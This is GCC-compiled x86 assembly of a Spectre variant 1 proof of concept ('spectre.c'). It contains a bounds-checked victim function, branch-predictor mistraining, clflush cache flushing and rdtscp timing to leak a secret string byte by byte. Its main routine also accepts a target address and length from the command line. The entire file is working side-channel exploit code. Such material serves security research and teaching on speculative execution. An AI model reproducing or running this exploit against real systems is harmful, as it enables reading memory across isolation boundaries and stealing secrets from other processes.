	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 4
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.local	results
	.comm	results,1024,32
	.text
	.globl	check
	.type	check, @function
check:
.LFB4271:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	DWORD PTR 8[ebp], eax
	jnb	.L2
	mov	eax, 1
	jmp	.L3
.L2:
	mov	eax, 0
.L3:
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4271:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4272:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	sub	esp, 16
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR array1_size@GOTOFF[eax]
	cmp	DWORD PTR 8[ebp], edx
	jnb	.L8
	mov	edx, DWORD PTR 8[ebp]
	sub	edx, 1
	mov	DWORD PTR -4[ebp], edx
	jmp	.L6
.L7:
	lea	ecx, array1@GOTOFF[eax]
	mov	edx, DWORD PTR -4[ebp]
	add	edx, ecx
	movzx	edx, BYTE PTR [edx]
	movzx	edx, dl
	sal	edx, 9
	movzx	ecx, BYTE PTR array2@GOTOFF[eax+edx]
	movzx	edx, BYTE PTR temp@GOTOFF[eax]
	and	edx, ecx
	mov	BYTE PTR temp@GOTOFF[eax], dl
	sub	DWORD PTR -4[ebp], 1
.L6:
	cmp	DWORD PTR -4[ebp], 0
	jns	.L7
.L8:
	nop
	leave
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4272:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4273:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	push	edi
	push	esi
	push	ebx
	sub	esp, 92
	.cfi_offset 7, -12
	.cfi_offset 6, -16
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR 12[ebp]
	mov	DWORD PTR -92[ebp], eax
	mov	eax, DWORD PTR 16[ebp]
	mov	DWORD PTR -96[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	xor	eax, eax
	mov	DWORD PTR -80[ebp], 0
	mov	DWORD PTR -68[ebp], 0
	jmp	.L10
.L11:
	mov	eax, DWORD PTR -68[ebp]
	mov	DWORD PTR results@GOTOFF[ebx+eax*4], 0
	add	DWORD PTR -68[ebp], 1
.L10:
	cmp	DWORD PTR -68[ebp], 255
	jle	.L11
	mov	DWORD PTR -72[ebp], 999
	jmp	.L12
.L24:
	mov	DWORD PTR -68[ebp], 0
	jmp	.L13
.L14:
	mov	eax, DWORD PTR -68[ebp]
	sal	eax, 9
	mov	edx, eax
	lea	eax, array2@GOTOFF[ebx]
	add	eax, edx
	mov	DWORD PTR -44[ebp], eax
	mov	eax, DWORD PTR -44[ebp]
	clflush	[eax]
	nop
	add	DWORD PTR -68[ebp], 1
.L13:
	cmp	DWORD PTR -68[ebp], 255
	jle	.L14
	mov	ecx, DWORD PTR array1_size@GOTOFF[ebx]
	mov	eax, DWORD PTR -72[ebp]
	cdq
	idiv	ecx
	mov	eax, edx
	mov	DWORD PTR -60[ebp], eax
	mov	DWORD PTR -64[ebp], 29
	jmp	.L15
.L18:
	lea	eax, array1_size@GOTOFF[ebx]
	mov	DWORD PTR -40[ebp], eax
	mov	eax, DWORD PTR -40[ebp]
	clflush	[eax]
	nop
	mov	DWORD PTR -76[ebp], 0
	jmp	.L16
.L17:
	mov	eax, DWORD PTR -76[ebp]
	add	eax, 1
	mov	DWORD PTR -76[ebp], eax
.L16:
	mov	eax, DWORD PTR -76[ebp]
	cmp	eax, 99
	jle	.L17
	mov	ecx, DWORD PTR -64[ebp]
	mov	edx, 715827883
	mov	eax, ecx
	imul	edx
	mov	eax, ecx
	sar	eax, 31
	sub	edx, eax
	mov	eax, edx
	add	eax, eax
	add	eax, edx
	add	eax, eax
	sub	ecx, eax
	mov	edx, ecx
	lea	eax, -1[edx]
	mov	ax, 0
	mov	DWORD PTR -48[ebp], eax
	mov	eax, DWORD PTR -48[ebp]
	shr	eax, 16
	or	DWORD PTR -48[ebp], eax
	mov	eax, DWORD PTR 8[ebp]
	xor	eax, DWORD PTR -60[ebp]
	and	eax, DWORD PTR -48[ebp]
	xor	eax, DWORD PTR -60[ebp]
	mov	DWORD PTR -48[ebp], eax
	push	DWORD PTR -48[ebp]
	call	victim_function
	add	esp, 4
	sub	DWORD PTR -64[ebp], 1
.L15:
	cmp	DWORD PTR -64[ebp], 0
	jns	.L18
	mov	DWORD PTR -68[ebp], 0
	jmp	.L19
.L23:
	mov	eax, DWORD PTR -68[ebp]
	imul	eax, eax, 167
	add	eax, 13
	and	eax, 255
	mov	DWORD PTR -56[ebp], eax
	mov	eax, DWORD PTR -56[ebp]
	sal	eax, 9
	mov	edx, eax
	lea	eax, array2@GOTOFF[ebx]
	add	eax, edx
	mov	DWORD PTR -52[ebp], eax
	lea	eax, -80[ebp]
	mov	DWORD PTR -32[ebp], eax
	rdtscp
	mov	esi, ecx
	mov	ecx, DWORD PTR -32[ebp]
	mov	DWORD PTR [ecx], esi
	mov	DWORD PTR -104[ebp], eax
	mov	DWORD PTR -100[ebp], edx
	mov	eax, DWORD PTR -52[ebp]
	movzx	eax, BYTE PTR [eax]
	movzx	eax, al
	mov	DWORD PTR -80[ebp], eax
	lea	eax, -80[ebp]
	mov	DWORD PTR -36[ebp], eax
	rdtscp
	mov	esi, ecx
	mov	ecx, DWORD PTR -36[ebp]
	mov	DWORD PTR [ecx], esi
	mov	esi, eax
	mov	edi, edx
	sub	esi, DWORD PTR -104[ebp]
	sbb	edi, DWORD PTR -100[ebp]
	mov	edx, 50
	mov	eax, 0
	cmp	edx, esi
	sbb	eax, edi
	jc	.L22
	mov	ecx, DWORD PTR array1_size@GOTOFF[ebx]
	mov	eax, DWORD PTR -72[ebp]
	cdq
	idiv	ecx
	mov	eax, edx
	movzx	eax, BYTE PTR array1@GOTOFF[ebx+eax]
	movzx	eax, al
	cmp	DWORD PTR -56[ebp], eax
	je	.L22
	mov	eax, DWORD PTR -56[ebp]
	mov	eax, DWORD PTR results@GOTOFF[ebx+eax*4]
	lea	edx, 1[eax]
	mov	eax, DWORD PTR -56[ebp]
	mov	DWORD PTR results@GOTOFF[ebx+eax*4], edx
.L22:
	add	DWORD PTR -68[ebp], 1
.L19:
	cmp	DWORD PTR -68[ebp], 255
	jle	.L23
	sub	DWORD PTR -72[ebp], 1
.L12:
	cmp	DWORD PTR -72[ebp], 0
	jg	.L24
	mov	eax, DWORD PTR results@GOTOFF[ebx]
	mov	edx, eax
	mov	eax, DWORD PTR -80[ebp]
	xor	eax, edx
	mov	DWORD PTR results@GOTOFF[ebx], eax
	nop
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	je	.L25
	call	__stack_chk_fail_local
.L25:
	lea	esp, -12[ebp]
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4273:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 4
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 4
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 4
.LC6:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
.LC7:
	.string	"result[%d]=%d "
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4274:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	esi
	push	ebx
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x74,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x7c
	.cfi_escape 0x10,0x3,0x2,0x75,0x78
	sub	esp, 92
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	esi, ecx
	mov	eax, DWORD PTR 4[esi]
	mov	DWORD PTR -92[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	xor	eax, eax
.L40:
	call	getchar@PLT
	mov	BYTE PTR -73[ebp], al
	cmp	BYTE PTR -73[ebp], 114
	jne	.L27
	mov	edx, DWORD PTR secret@GOTOFF[ebx]
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	sub	esp, 4
	push	edx
	push	eax
	lea	eax, .LC1@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	lea	edx, array1@GOTOFF[ebx]
	sub	eax, edx
	mov	DWORD PTR -72[ebp], eax
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	sub	esp, 12
	push	eax
	call	strlen@PLT
	add	esp, 16
	mov	DWORD PTR -68[ebp], eax
	mov	DWORD PTR -64[ebp], 0
	jmp	.L28
.L29:
	lea	edx, array2@GOTOFF[ebx]
	mov	eax, DWORD PTR -64[ebp]
	add	eax, edx
	mov	BYTE PTR [eax], 1
	add	DWORD PTR -64[ebp], 1
.L28:
	cmp	DWORD PTR -64[ebp], 131071
	jbe	.L29
	cmp	DWORD PTR [esi], 3
	jne	.L30
	mov	eax, DWORD PTR -92[ebp]
	add	eax, 4
	mov	eax, DWORD PTR [eax]
	sub	esp, 4
	lea	edx, -72[ebp]
	push	edx
	lea	edx, .LC2@GOTOFF[ebx]
	push	edx
	push	eax
	call	__isoc99_sscanf@PLT
	add	esp, 16
	mov	eax, DWORD PTR -72[ebp]
	lea	edx, array1@GOTOFF[ebx]
	sub	eax, edx
	mov	DWORD PTR -72[ebp], eax
	mov	eax, DWORD PTR -92[ebp]
	add	eax, 8
	mov	eax, DWORD PTR [eax]
	sub	esp, 4
	lea	edx, -68[ebp]
	push	edx
	lea	edx, .LC3@GOTOFF[ebx]
	push	edx
	push	eax
	call	__isoc99_sscanf@PLT
	add	esp, 16
	mov	eax, DWORD PTR -68[ebp]
	mov	edx, DWORD PTR -72[ebp]
	sub	esp, 4
	push	eax
	push	edx
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
.L30:
	mov	eax, DWORD PTR -68[ebp]
	sub	esp, 8
	push	eax
	lea	eax, .LC5@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	DWORD PTR -60[ebp], 0
	jmp	.L31
.L35:
	mov	edx, DWORD PTR secret@GOTOFF[ebx]
	mov	eax, DWORD PTR -60[ebp]
	add	eax, edx
	movzx	eax, BYTE PTR [eax]
	movsx	edx, al
	mov	ecx, DWORD PTR secret@GOTOFF[ebx]
	mov	eax, DWORD PTR -60[ebp]
	add	eax, ecx
	movzx	eax, BYTE PTR [eax]
	movsx	eax, al
	mov	ecx, DWORD PTR -72[ebp]
	push	edx
	push	eax
	push	ecx
	lea	eax, .LC6@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	add	DWORD PTR -60[ebp], 1
	mov	eax, DWORD PTR -72[ebp]
	lea	edx, 1[eax]
	mov	DWORD PTR -72[ebp], edx
	sub	esp, 4
	lea	edx, -40[ebp]
	push	edx
	lea	edx, -30[ebp]
	push	edx
	push	eax
	call	readMemoryByte
	add	esp, 16
	mov	eax, DWORD PTR results@GOTOFF[ebx]
	mov	DWORD PTR -52[ebp], eax
	mov	DWORD PTR -56[ebp], 1
	jmp	.L32
.L34:
	mov	eax, DWORD PTR -56[ebp]
	sub	eax, 1
	mov	eax, DWORD PTR results@GOTOFF[ebx+eax*4]
	mov	DWORD PTR -48[ebp], eax
	mov	eax, DWORD PTR -56[ebp]
	mov	eax, DWORD PTR results@GOTOFF[ebx+eax*4]
	mov	DWORD PTR -44[ebp], eax
	mov	eax, DWORD PTR -48[ebp]
	cmp	eax, DWORD PTR -44[ebp]
	jle	.L33
	mov	eax, DWORD PTR -48[ebp]
	sub	eax, DWORD PTR -44[ebp]
	cmp	eax, 100
	jle	.L33
	mov	eax, DWORD PTR -56[ebp]
	sub	eax, 1
	mov	eax, DWORD PTR results@GOTOFF[ebx+eax*4]
	mov	edx, DWORD PTR -56[ebp]
	sub	edx, 1
	sub	esp, 4
	push	eax
	push	edx
	lea	eax, .LC7@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	eax, DWORD PTR -56[ebp]
	mov	eax, DWORD PTR results@GOTOFF[ebx+eax*4]
	sub	esp, 4
	push	eax
	push	DWORD PTR -56[ebp]
	lea	eax, .LC7@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
.L33:
	add	DWORD PTR -56[ebp], 1
.L32:
	cmp	DWORD PTR -56[ebp], 255
	jle	.L34
	sub	esp, 12
	push	10
	call	putchar@PLT
	add	esp, 16
.L31:
	mov	eax, DWORD PTR -68[ebp]
	sub	eax, 1
	mov	DWORD PTR -68[ebp], eax
	mov	eax, DWORD PTR -68[ebp]
	test	eax, eax
	jns	.L35
	jmp	.L40
.L27:
	cmp	BYTE PTR -73[ebp], 10
	je	.L43
	cmp	BYTE PTR -73[ebp], 105
	jne	.L44
	call	getpid@PLT
	mov	ecx, eax
	lea	eax, check@GOTOFF[ebx]
	cdq
	add	eax, 33
	adc	edx, 0
	push	ecx
	push	edx
	push	eax
	lea	eax, .LC8@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	jmp	.L40
.L43:
	nop
	jmp	.L40
.L44:
	nop
	mov	eax, 0
	mov	edx, DWORD PTR -28[ebp]
	sub	edx, DWORD PTR gs:20
	je	.L42
	call	__stack_chk_fail_local
.L42:
	lea	esp, -12[ebp]
	pop	ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4274:
	.size	main, .-main
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB4275:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE4275:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB4276:
	.cfi_startproc
	mov	ebx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE4276:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
